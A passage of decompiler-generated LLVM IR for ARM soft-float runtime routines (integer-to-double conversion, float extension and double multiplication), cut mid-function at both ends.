  uselistorder i32 %v4_1a490, { 1, 0 }
  uselistorder i32 %v1_1a490, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a484, { 1, 0 }
  uselistorder i32 %v0_1a4d0, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 26, 10, 7, 9, 8, 27, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 9, 10, 11, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 20, 22, 23, 24, 17, 16, 19, 18, 1 }
  uselistorder i32 -4, { 10, 0, 1, 53, 11, 49, 12, 20, 73, 74, 75, 6, 21, 22, 23, 76, 77, 78, 7, 24, 25, 26, 79, 80, 81, 8, 27, 28, 82, 19, 18, 83, 84, 85, 17, 16, 15, 14, 29, 30, 31, 32, 33, 5, 34, 3, 35, 4, 86, 13, 36, 45, 46, 47, 48, 37, 38, 61, 62, 63, 9, 64, 65, 66, 39, 60, 2, 40, 54, 55, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 41, 50, 51, 52, 42, 43, 44 }
  uselistorder i32 15, { 8, 9, 3, 15, 10, 11, 12, 13, 0, 16, 1, 18, 17, 2, 14, 4, 5, 6, 7 }
  uselistorder i32 -8, { 11, 12, 1, 40, 19, 20, 21, 22, 23, 24, 18, 17, 10, 16, 15, 14, 13, 25, 26, 27, 28, 29, 9, 44, 45, 30, 31, 32, 33, 34, 43, 46, 35, 47, 39, 36, 37, 38, 2, 41, 42, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 128, { 13, 14, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 17, 18, 3, 4, 12, 19, 5, 16, 22, 15 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 75, 74, 72, 32, 31, 76, 33, 34, 35, 36, 37, 38, 39, 73, 40, 42, 41, 43, 45, 44, 46, 47, 48, 49, 50, 52, 51, 53, 56, 55, 54, 57, 58, 59, 62, 61, 60, 63, 65, 66, 64, 67, 69, 70, 68, 71 }
  uselistorder i32 32768, { 3, 4, 2, 7, 0, 1, 6, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 17, 3, 20, 12, 13, 4, 18, 19, 24, 25, 2, 26, 0, 27, 28, 5, 6, 7, 9, 8, 10, 15, 22, 16, 14, 23, 11, 21 }
  uselistorder i32 20, { 5, 41, 42, 2, 8, 47, 0, 30, 43, 44, 16, 17, 18, 19, 40, 51, 9, 52, 53, 3, 54, 48, 10, 31, 32, 37, 38, 39, 20, 11, 21, 22, 1, 55, 6, 12, 56, 45, 46, 4, 7, 33, 34, 35, 36, 23, 49, 24, 25, 26, 27, 28, 29, 15, 13, 50, 14 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1a4dc, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a55c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1a55c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1a55c = load i32, i32* @r4, align 4
  %v2_1a55c = icmp eq i32 %v0_1a55c, 0
  %v1_1a560 = xor i32 %arg3, 1048576
  store i32 %v1_1a560, i32* @r3, align 4
  br i1 %v2_1a55c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1a55c
  %v1_1a564 = load i32, i32* @r1, align 4
  %v2_1a564 = xor i32 %v1_1a564, 1048576
  store i32 %v2_1a564, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a55c
  %v1_1a56c = load i32, i32* @r5, align 4
  %v2_1a56c = add i32 %v1_1a56c, -1
  store i32 %v2_1a56c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a570 = call i32 @function_1a3b4()
  store i32 %v0_1a570, i32* %r0.global-to-local, align 4
  %v0_1a574 = load i32, i32* @r4, align 4
  %v0_1a574.off = add i32 %v0_1a574, 4194303
  %tmp = icmp ult i32 %v0_1a574.off, 2097152
  %v1_1a604 = load i32, i32* @r5, align 4
  %v1_1a604.off = add i32 %v1_1a604, 4194303
  %tmp44 = icmp ult i32 %v1_1a604.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1a580

dec_label_pc_1a580:                               ; preds = %bb30
  %v4_1a580 = icmp eq i32 %v1_1a604, %v0_1a574
  br i1 %v4_1a580, label %bb31, label %dec_label_pc_1a58c

bb31:                                             ; preds = %dec_label_pc_1a580
  %v2_1a584 = load i32, i32* @r2, align 4
  %v5_1a584 = icmp eq i32 %v2_1a584, %v0_1a570
  br i1 %v5_1a584, label %dec_label_pc_1a5a0, label %dec_label_pc_1a58c

dec_label_pc_1a58c:                               ; preds = %dec_label_pc_1a580, %bb31
  %v2_1a58c = or i32 %v0_1a574, %v0_1a570
  %v4_1a58c = icmp eq i32 %v2_1a58c, 0
  br i1 %v4_1a58c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1a58c
  %v1_1a594 = load i32, i32* @r2, align 4
  store i32 %v1_1a594, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a58c, %bb32
  %v1_1a59c = phi i32 [ %v0_1a570, %dec_label_pc_1a58c ], [ %v1_1a594, %bb32 ]
  ret i32 %v1_1a59c

dec_label_pc_1a5a0:                               ; preds = %bb31
  %v0_1a5a0 = load i32, i32* @r1, align 4
  %v1_1a5a0 = load i32, i32* @r3, align 4
  %v4_1a5a0 = icmp eq i32 %v1_1a5a0, %v0_1a5a0
  br i1 %v4_1a5a0, label %dec_label_pc_1a5a0..thread8_crit_edge, label %bb33

dec_label_pc_1a5a0..thread8_crit_edge:            ; preds = %dec_label_pc_1a5a0
  %v0_1a5b0.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1a5a0
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a5a0..thread8_crit_edge, %bb33
  %v0_1a5b0 = phi i32 [ %v0_1a5b0.pre, %dec_label_pc_1a5a0..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1a5b0 = xor i1 %v4_1a5a0, true
  call void @__pseudo_cond_branch(i1 %v2_1a5b0, i32 %v0_1a5b0)
  %v0_1a5b4 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1a5b4, 2097152
  br i1 %tmp45, label %dec_label_pc_1a5bc, label %dec_label_pc_1a5d0

dec_label_pc_1a5bc:                               ; preds = %.thread8
  %v0_1a5bc = load i32, i32* %r0.global-to-local, align 4
  %v1_1a5bc = icmp slt i32 %v0_1a5bc, 0
  %v2_1a5bc = mul i32 %v0_1a5bc, 2
  store i32 %v2_1a5bc, i32* %r0.global-to-local, align 4
  %v0_1a5c0 = load i32, i32* @r1, align 4
  %v3_1a5c0 = mul i32 %v0_1a5c0, 2
  %v4_1a5c0 = zext i1 %v1_1a5bc to i32
  %v5_1a5c0 = or i32 %v3_1a5c0, %v4_1a5c0
  %v9_1a5c0 = icmp ule i32 %v5_1a5c0, %v0_1a5c0
  %v10_1a5c0 = icmp ult i32 %v3_1a5c0, %v0_1a5c0
  %v11_1a5c0 = select i1 %v1_1a5bc, i1 %v9_1a5c0, i1 %v10_1a5c0
  br i1 %v11_1a5c0, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1a5bc
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1a5bc, %bb34
  ret i32 %v2_1a5bc

dec_label_pc_1a5d0:                               ; preds = %.thread8
  %v2_1a5d0 = icmp ugt i32 %v0_1a5b4, -4194305
  br i1 %v2_1a5d0, label %dec_label_pc_1a5d0..thread9_crit_edge, label %bb36

dec_label_pc_1a5d0..thread9_crit_edge:            ; preds = %dec_label_pc_1a5d0
  %v0_1a5dc.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1a5d0
  %v1_1a5d4 = load i32, i32* @r1, align 4
  %v2_1a5d4 = add i32 %v1_1a5d4, 1048576
  store i32 %v2_1a5d4, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1a5d0..thread9_crit_edge, %bb36
  %v0_1a5dc = phi i32 [ %v0_1a5dc.pre, %dec_label_pc_1a5d0..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1a5dc = xor i1 %v2_1a5d0, true
  call void @__pseudo_cond_branch(i1 %v2_1a5dc, i32 %v0_1a5dc)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1a610.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1a610.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1a5fc = load i32, i32* @r3, align 4
  %v1_1a600 = load i32, i32* @r2, align 4
  store i32 %v1_1a600, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1a61023 = phi i32 [ %v1_1a610.pre, %.thread14 ], [ %v1_1a5fc, %bb37 ]
  %v1_1a60c = phi i32 [ %v0_1a570, %.thread14 ], [ %v1_1a600, %bb37 ]
  store i32 %v1_1a60c, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1a61c = phi i32 [ %v1_1a61023, %bb38 ], [ %v1_1a610.pre, %.thread11 ]
  %v1_1a624 = phi i32 [ %v1_1a60c, %bb38 ], [ %v0_1a570, %.thread11 ]
  %v4_1a610 = mul i32 %v1_1a61c, 4096
  %v5_1a610 = or i32 %v4_1a610, %v1_1a624
  %v7_1a610 = icmp eq i32 %v5_1a610, 0
  br i1 %v7_1a610, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1a614 = load i32, i32* @r2, align 4
  %v2_1a614 = load i32, i32* @r3, align 4
  %v5_1a614 = mul i32 %v2_1a614, 4096
  %v6_1a614 = or i32 %v5_1a614, %v1_1a614
  %v8_1a614 = icmp eq i32 %v6_1a614, 0
  br i1 %v8_1a614, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1a618 = icmp eq i32 %v2_1a614, %v1_1a61c
  br i1 %v5_1a618, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1a624

; uselistorder directives
  uselistorder i32 %v1_1a610.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a5c0, { 1, 2, 0 }
  uselistorder i32 %v2_1a5bc, { 1, 0 }
  uselistorder i1 %v1_1a5bc, { 1, 0 }
  uselistorder i32 %v0_1a5b4, { 1, 0 }
  uselistorder i1 %v4_1a5a0, { 1, 0 }
  uselistorder i32 %v0_1a574, { 2, 0, 1 }
  uselistorder i32 %v0_1a570, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1a58c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1a628 = icmp eq i32 %arg1, 0
  br i1 %v2_1a628, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1a630 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a628, i32 %v0_1a630)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1a648 = call i32 @function_1a468()
  ret i32 %v0_1a648

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1a64c = icmp eq i32 %arg1, 0
  br i1 %v2_1a64c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1a654 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a64c, i32 %v0_1a654)
  store i32 1074, i32* @r4, align 4
  %v1_1a664 = and i32 %arg1, -2147483648
  store i32 %v1_1a664, i32* @r5, align 4
  %v2_1a664 = icmp eq i32 %v1_1a664, 0
  br i1 %v2_1a664, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a668 = sub i32 0, %arg1
  store i32 %v2_1a668, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1a670 = call i32 @function_1a468()
  ret i32 %v0_1a670

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1a674 = mul i32 %arg1, 2
  store i32 %v2_1a674, i32* %r2.global-to-local, align 4
  %v4_1a674 = icmp eq i32 %v2_1a674, 0
  %v1_1a678 = and i32 %v2_1a674, 4
  %v2_1a678 = icmp ne i32 %v1_1a678, 0
  %v3_1a678 = sdiv i32 %v2_1a674, 8
  %v3_1a67c = zext i1 %v2_1a678 to i32
  %v6_1a67c = zext i32 %v3_1a678 to i64
  %v7_1a67c = sub nsw i32 33, %v3_1a678
  %v8_1a67c = zext i32 %v7_1a67c to i64
  %v9_1a67c = shl i64 %v6_1a67c, %v8_1a67c
  %v10_1a67c = sub nsw i32 32, %v3_1a678
  %v11_1a67c = shl i32 %v3_1a67c, %v10_1a67c
  %v12_1a67c = zext i32 %v11_1a67c to i64
  %v14_1a67c = or i64 %v12_1a67c, %v9_1a67c
  %v15_1a67c = trunc i64 %v14_1a67c to i32
  store i32 %v15_1a67c, i32* %r1.global-to-local, align 4
  %v3_1a680 = mul i32 %arg1, 536870912
  store i32 %v3_1a680, i32* @r0, align 4
  br i1 %v4_1a674, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1a684 = and i32 %v2_1a674, -16777216
  store i32 %v2_1a684, i32* @r3, align 4
  %v4_1a684 = icmp eq i32 %v2_1a684, 0
  br i1 %v4_1a684, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1a688 = icmp ugt i32 %v2_1a674, -16777217
  br i1 %v4_1a688, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1a68c = xor i32 %v15_1a67c, 939524096
  store i32 %v2_1a68c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1a690 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1a690 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a690, i32 %v0_1a690)
  %v0_1a694 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a694 = icmp eq i32 %v0_1a694, 0
  br i1 %v2_1a694, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1a698 = load i32, i32* @r3, align 4
  %v4_1a698 = icmp eq i32 %v1_1a698, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1a69c = phi i1 [ true, %.thread1 ], [ %v4_1a698, %bb9 ]
  %v0_1a69c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a69c, i32 %v0_1a69c)
  store i32 896, i32* @r4, align 4
  %v0_1a6a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a6a8 = and i32 %v0_1a6a8, -2147483648
  store i32 %v1_1a6a8, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1a6a8 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1a6ac = bitcast float %tmp11 to i32
  store i32 %v1_1a6ac, i32* @r1, align 4
  %v0_1a6b0 = call i32 @function_1a468()
  ret i32 %v0_1a6b0

; uselistorder directives
  uselistorder i32 %v3_1a678, { 1, 2, 0 }
  uselistorder i32 %v2_1a674, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1a468, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1a6b4 = or i32 %arg2, %arg1
  %v4_1a6b4 = icmp eq i32 %v2_1a6b4, 0
  %v0_1a6b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1a6b4, i32 %v0_1a6b8)
  store i32 0, i32* @r5, align 4
  %v0_1a6c4 = call i32 @function_1a6e4()
  ret i32 %v0_1a6c4
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a6c8 = or i32 %arg2, %arg1
  %v4_1a6c8 = icmp eq i32 %v2_1a6c8, 0
  %v0_1a6cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1a6c8, i32 %v0_1a6cc)
  %v1_1a6d8 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1a6d8, i32 ptrtoint (i32* @global_var_1a6e4.984 to i32))
  %v1_1a6dc = sub i32 0, %arg1
  ret i32 %v1_1a6dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1a6e4() local_unnamed_addr {
dec_label_pc_1a6e4:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1a6ec = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1a6ec, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1a408.982 to i32))
  %tmp6 = icmp ult i32 %v0_1a6ec, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1a6e4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1a6e4, %bb
  %v1_1a704 = phi i32 [ 3, %dec_label_pc_1a6e4 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1a6ec, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a704 = add nuw nsw i32 %v1_1a704, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1a708 = phi i32 [ %v1_1a704, %bb3 ], [ %v2_1a704, %bb4 ]
  %not. = icmp slt i32 %v0_1a6ec, 0
  %v4_1a708 = zext i1 %not. to i32
  %v5_1a708 = add nsw i32 %v0_1a708, %v4_1a708
  %v1_1a70c = sub nsw i32 32, %v5_1a708
  %v0_1a710 = load i32, i32* @r0, align 4
  %v6_1a710 = shl i32 %v0_1a710, %v1_1a70c
  store i32 %v6_1a710, i32* @ip, align 4
  %v6_1a714 = lshr i32 %v0_1a710, %v5_1a708
  %v1_1a718 = load i32, i32* @r1, align 4
  %v7_1a718 = shl i32 %v1_1a718, %v1_1a70c
  %v8_1a718 = or i32 %v7_1a718, %v6_1a714
  %v6_1a71c = lshr i32 %v1_1a718, %v5_1a708
  %v0_1a720 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a720 = add i32 %v0_1a720, %v5_1a708
  store i32 %v2_1a720, i32* @r4, align 4
  %v4_1a724 = sext i32 %v8_1a718 to i64
  %v5_1a724 = call i32 @function_1a408(i64 %v4_1a724, i32 %v6_1a71c, i32 %v5_1a708, i32 %v1_1a70c)
  ret i32 %v5_1a724

; uselistorder directives
  uselistorder i32 %v5_1a708, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 24, 25, 3, 18, 19, 26, 27, 21, 22, 5, 6, 29, 2, 0, 7, 23, 1, 8, 9, 10, 11, 12, 13, 20, 14, 17, 15, 16, 28 }
  uselistorder i32 3, { 49, 12, 35, 59, 36, 60, 61, 62, 64, 8, 65, 16, 66, 54, 0, 13, 67, 9, 1, 2, 51, 55, 3, 4, 37, 38, 74, 39, 40, 41, 42, 43, 44, 56, 6, 20, 57, 21, 48, 7, 50, 45, 75, 14, 70, 18, 71, 17, 72, 19, 69, 10, 68, 11, 58, 5, 63, 73, 46, 22, 52, 23, 24, 53, 25, 47, 28, 27, 26, 34, 29, 30, 31, 32, 33, 15 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a728 = load i32, i32* @r4, align 4
  store i32 %v3_1a728, i32* %stack_var_-16, align 4
  %v12_1a728 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1a734 = udiv i32 %arg2, 1048576
  %v5_1a734 = urem i32 %v4_1a734, 2048
  store i32 %v5_1a734, i32* %r4.global-to-local, align 4
  %v6_1a734 = icmp eq i32 %v5_1a734, 0
  br i1 %v6_1a734, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1a738 = udiv i32 %arg4, 1048576
  %v6_1a738 = urem i32 %v5_1a738, 2048
  store i32 %v6_1a738, i32* @r5, align 4
  %v7_1a738 = icmp eq i32 %v6_1a738, 0
  br i1 %v7_1a738, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1a73c = icmp eq i32 %v5_1a734, 2047
  br i1 %v5_1a73c, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1a740 = icmp eq i32 %v6_1a738, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1a744 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1a740, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1a748.987 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1a744, i32 ptrtoint (i32* @global_var_1a920.985 to i32))
  %v0_1a748 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a748 = load i32, i32* @r5, align 4
  %v2_1a748 = add i32 %v1_1a748, %v0_1a748
  store i32 %v2_1a748, i32* %r4.global-to-local, align 4
  %v2_1a74c = xor i32 %arg4, %arg2
  %v1_1a750 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1a750, -2097152
  %v5_1a750 = add i32 %tmp51, -1
  %v6_1a750 = and i32 %v5_1a750, %arg2
  store i32 %v6_1a750, i32* %r1.global-to-local, align 4
  %v6_1a754 = and i32 %v5_1a750, %arg4
  %v5_1a758 = mul i32 %arg2, 4096
  %v6_1a758 = or i32 %v5_1a758, %tmp32
  %v8_1a758 = icmp eq i32 %v6_1a758, 0
  br i1 %v8_1a758, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1a7605 = or i32 %v6_1a750, 1048576
  store i32 %v1_1a7605, i32* %r1.global-to-local, align 4
  %v1_1a7647 = or i32 %v6_1a754, 1048576
  br label %dec_label_pc_1a7e4

bb40:                                             ; preds = %.thread2
  %v6_1a75c = mul i32 %arg4, 4096
  %v7_1a75c = or i32 %v6_1a75c, %arg3
  %v9_1a75c = icmp eq i32 %v7_1a75c, 0
  %v1_1a760 = or i32 %v6_1a750, 1048576
  store i32 %v1_1a760, i32* %r1.global-to-local, align 4
  %v1_1a764 = or i32 %v6_1a754, 1048576
  br i1 %v9_1a75c, label %dec_label_pc_1a7e4, label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %bb40
  %v6_1a76c = mul nuw i64 %tmp, %arg1
  %v7_1a76c = udiv i64 %v6_1a76c, 4294967296
  %v9_1a76c = trunc i64 %v6_1a76c to i32
  store i32 %v9_1a76c, i32* %ip.global-to-local, align 4
  %v7_1a774 = zext i32 %v1_1a760 to i64
  %v11_1a774 = mul nuw nsw i64 %v7_1a774, %tmp
  %v12_1a774 = add i64 %v11_1a774, %v7_1a76c
  %v1_1a778 = and i32 %v2_1a74c, -2147483648
  %v10_1a77c = zext i32 %v1_1a764 to i64
  %v11_1a77c = mul nuw i64 %v10_1a77c, %arg1
  %v12_1a77c = add i64 %v12_1a774, %v11_1a77c
  %v13_1a77c = udiv i64 %v12_1a77c, 4294967296
  %v15_1a77c = trunc i64 %v12_1a77c to i32
  %v10_1a784 = mul nuw i64 %v10_1a77c, %v7_1a774
  %v11_1a784 = add i64 %v13_1a77c, %v10_1a784
  %v12_1a784 = udiv i64 %v11_1a784, 4294967296
  %v13_1a784 = trunc i64 %v12_1a784 to i32
  %v14_1a784 = trunc i64 %v11_1a784 to i32
  %v2_1a788 = icmp eq i32 %v9_1a76c, 0
  br i1 %v2_1a788, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1a76c
  %v2_1a78c = or i32 %v15_1a77c, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1a76c, %bb41
  %storemerge = phi i32 [ %v2_1a78c, %bb41 ], [ %v15_1a77c, %dec_label_pc_1a76c ]
  %v0_1a7a0 = phi i32 [ %v2_1a78c, %bb41 ], [ %v15_1a77c, %dec_label_pc_1a76c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1a790 = add i32 %v2_1a748, -255
  %v2_1a794 = icmp ugt i32 %v13_1a784, 511
  %v2_1a798 = icmp eq i1 %v2_1a794, false
  %v3_1a798 = add i32 %v2_1a748, -1023
  %v5_1a798 = sext i1 %v2_1a798 to i32
  %v6_1a798 = add i32 %v3_1a798, %v5_1a798
  store i32 %v6_1a798, i32* %r4.global-to-local, align 4
  %v3_1a79c = icmp ugt i32 %v1_1a790, 768
  br i1 %v3_1a79c, label %dec_label_pc_1a7ac, label %dec_label_pc_1a7a0

dec_label_pc_1a7a0:                               ; preds = %bb42
  %v1_1a7a0 = icmp slt i32 %v0_1a7a0, 0
  %v2_1a7a0 = mul i32 %v0_1a7a0, 2
  store i32 %v2_1a7a0, i32* %lr.global-to-local, align 4
  %v3_1a7a4 = mul i32 %v14_1a784, 2
  %v4_1a7a4 = zext i1 %v1_1a7a0 to i32
  %v5_1a7a4 = or i32 %v4_1a7a4, %v3_1a7a4
  %v9_1a7a4 = icmp ule i32 %v5_1a7a4, %v14_1a784
  %v10_1a7a4 = icmp ult i32 %v3_1a7a4, %v14_1a784
  %v11_1a7a4 = select i1 %v1_1a7a0, i1 %v9_1a7a4, i1 %v10_1a7a4
  %v3_1a7a825 = mul nuw nsw i64 %v12_1a784, 2
  %v3_1a7a8 = trunc i64 %v3_1a7a825 to i32
  %v4_1a7a8 = zext i1 %v11_1a7a4 to i32
  %v5_1a7a8 = or i32 %v4_1a7a8, %v3_1a7a8
  br label %dec_label_pc_1a7ac

dec_label_pc_1a7ac:                               ; preds = %bb42, %dec_label_pc_1a7a0
  %v0_1a7bc = phi i32 [ %v0_1a7a0, %bb42 ], [ %v2_1a7a0, %dec_label_pc_1a7a0 ]
  %v0_1a7b4 = phi i32 [ %v14_1a784, %bb42 ], [ %v5_1a7a4, %dec_label_pc_1a7a0 ]
  %v1_1a7ac = phi i32 [ %v13_1a784, %bb42 ], [ %v5_1a7a8, %dec_label_pc_1a7a0 ]
  %v4_1a7ac = mul i32 %v1_1a7ac, 2048
